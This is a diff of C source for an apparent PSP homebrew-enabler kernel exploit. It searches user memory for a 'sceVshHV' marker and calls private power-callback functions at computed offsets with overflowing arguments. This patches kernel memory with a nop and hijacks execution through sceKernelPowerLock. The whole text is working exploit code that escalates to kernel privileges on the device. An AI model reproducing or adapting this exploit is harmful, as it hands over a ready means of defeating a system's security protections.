@@ -26,10 +26,6 @@ static int (*func_rebootex)(unsigned int, unsigned int, unsigned int, unsigned i
 /* model number */
 static int model;
 
-#define panic() do {\
-	__asm__ ("break");\
-} while (0)
-
 static unsigned int size_rebootex_bin;
 static unsigned char rebootex_bin[];
 
@@ -111,89 +107,104 @@ ClearCaches(void)
 	sceKernelDcacheWritebackInvalidateAll();
 }
 
+#define USER_MEM_START	((void *) 0x08800000)
+#define USER_MEM_END	((void *) 0x0A000000)
+
+static inline u32
+locate_scevsh(void)
+{
+	unsigned int *addr_lo, *addr_hi;
+	
+	addr_lo = USER_MEM_START;
+	addr_hi = USER_MEM_START + 4;
+
+	/* search for "sceVshHV" */
+	do {
+		if ((*addr_lo == 0x56656373) && (*addr_hi == 0x56486873))
+			break;
+		addr_lo++;
+		addr_hi++;
+	} while (addr_hi < (unsigned int *) USER_MEM_END);
+
+	if (addr_hi == USER_MEM_END)
+		return 0;
+
+	return (u32) addr_lo;
+}
+
+
 int
 main(void)
 {
-	char buf[168];
-	pspUtilityHtmlViewerParam *param = (pspUtilityHtmlViewerParam *) buf;
-	unsigned int *p = (unsigned int *) buf;
+	static int __attribute__ ((aligned (16))) power_buf[0x40000];
+
+	pspUtilityHtmlViewerParam param;
 	SceUID sceuid;
-	unsigned int intr;
-	unsigned int* address_low = (unsigned int *) 0x08800000;
-	unsigned int* address_high = (unsigned int *) 0x08800004;
-	u32 kernel_entry, entry_addr;
+	unsigned int i;
+	u32 scevsh_addr, kernel_entry, entry_addr;
 
 	/* prototype of sceUtility_private_2DC8380C, scePower_driver_CE5D389B */
-	int (*_scePowerUnregisterCallback)(int);
+	int (*_scePowerUnregisterCallback)(u32);
+
 	/* prototype of sceUtility_private_764F5A3C, scePower_driver_1A41E0ED */
-	void *(*_scePowerRegisterCallback)(int, SceUID);
+	void *(*_scePowerRegisterCallback)(u32, SceUID);
 
 
 	loginit();
 
-	memset(buf, 0, 168);
-	*p = 168;
-	p += 4;
-	*p = 19;
+	memset(&param, 0, sizeof(param));
+	param.base.size = sizeof(param);
+	param.base.accessThread = 0x13;
 
-	sceUtilityHtmlViewerInitStart(param);
+	sceUtilityHtmlViewerInitStart(&param);
 	sceKernelDelayThread(1000000);
 
 	log("start...\n");
 
-	/* search for "sceVshHV" */
-	do {
-		if ((*address_low == 0x56656373) && (*address_high == 0x56486873))
-			break;
-		address_low++;
-		address_high++;
-	} while (address_high < (unsigned int *) 0x0A000000);
+	if (!(scevsh_addr = locate_scevsh())) {
+		log("can't find vsh entry\n");
+		goto out;
+	}
+	_scePowerUnregisterCallback = (void *) (scevsh_addr - 648U);
+	_scePowerRegisterCallback = (void *) (scevsh_addr - 624U);
 
-	if (address_high == (unsigned int *) 0x0A000000)
-		panic();
-
-	log("find htmlviewer entry at %p\n", address_low);
-	memset((void *) 0x08800000, 0, 0x00100000);
-	log("memset done\n");
-
-	_scePowerUnregisterCallback = (void *) ((unsigned int) address_low - 648U);
-	log("power unregister at %p\n", _scePowerUnregisterCallback);
-	_scePowerUnregisterCallback(0x08080000); /* it will save -1 to addr (p) to enable scePowerRegisterCallback */
-	log("power unregister done\n");
+	memset(power_buf, 0, sizeof(power_buf));
+	log("power unregister 0x%08x\n", (unsigned int) power_buf + 0x78000000U);
+	/* 0x78000000 + 0x88000000 will overflow, while addr of power_buf is left */
+	_scePowerUnregisterCallback((((u32) power_buf) >> 4) + 0x07800000U);
+	log("power unregister OK\n");
 	ClearCaches();
 
-	p = (unsigned int *) (0x08800000);
-
-	do {
-		if (*p == 0xFFFFFFFF)
+	for (i = 0; i < sizeof(power_buf) / 4; i++) {
+		if (power_buf[i] == -1)
 			break;
-		p++;
-	} while (p < (unsigned int *) (0x08900000));
+	}
 
-	if (p == (unsigned int *) (0x08900000)) /* panic if unregister fails */
-		panic();
+	if (i == sizeof(power_buf) / 4) {
+		log("can't find -1 in range\n");
+		goto out;
+	}
 
-	log("find -1 at %p\n", p);
+	log("find -1 at offset 0x%08x\n", i * 4);
 
 	sceuid = sceKernelCreateCallback("hen", 0, 0);
-	_scePowerRegisterCallback = (void *) ((unsigned int) address_low - 624U);
-	log("power register\n");
-	/* this line stores 0/nop to 0x0880CCBC */
-	_scePowerRegisterCallback((0x0880CCB0U - (unsigned int) p) >> 4, sceuid);
-	log("power register done\n");
+	log("power register 0x%08x\n", 0xCCB0U - i * 4);
+	/* this line stores 0/nop to 0x8800CCBC */
+	_scePowerRegisterCallback((0xCCB0U - i * 4) >> 4, sceuid);
+	log("power register OK\n");
 	ClearCaches();
 
 	kernel_entry = (u32) power_callback;
 	entry_addr = ((u32) &kernel_entry) - 16;
 
-	sceKernelDelayThread(10000000);
-
 	log("suspend intr\n");
-	intr = sceKernelCpuSuspendIntr();
+	i = sceKernelCpuSuspendIntr();
 	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x4234);
-	sceKernelCpuResumeIntr(intr);
+	sceKernelCpuResumeIntr(i);
 	log("resumed intr\n");
 
+out:
+	sceKernelDelayThread(10000000);
 	sceKernelExitGame();
 	sceKernelExitDeleteThread(0);
 
